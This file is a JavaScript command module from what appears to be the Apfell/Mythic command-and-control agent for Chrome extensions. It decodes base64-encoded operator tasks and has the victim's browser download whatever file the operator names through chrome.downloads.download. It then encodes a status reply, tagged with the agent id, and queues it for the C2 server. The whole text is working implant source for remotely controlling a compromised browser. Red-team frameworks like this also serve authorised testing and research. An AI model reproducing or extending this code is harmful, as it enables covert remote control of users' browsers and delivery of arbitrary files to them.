download = function(task) {
    let args = JSON.parse(atob(task['params'].toString()));
    chrome.downloads.download(args, function(downloadID){
        if (downloadID == undefined) {
            downloadID = "null (error)"
        }
        response = {'task_id':task['task_id'], 'user_output':'started download with id ' + downloadID, 'completed':true};
        outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
        enc = JSON.stringify(outer_response);
        final = apfell.apfellid + enc;
        msg = btoa(unescape(encodeURIComponent(final)));
        out.push(msg);
    });
};

C2.commands[download.name] = download;
COMMAND_ENDS_HERE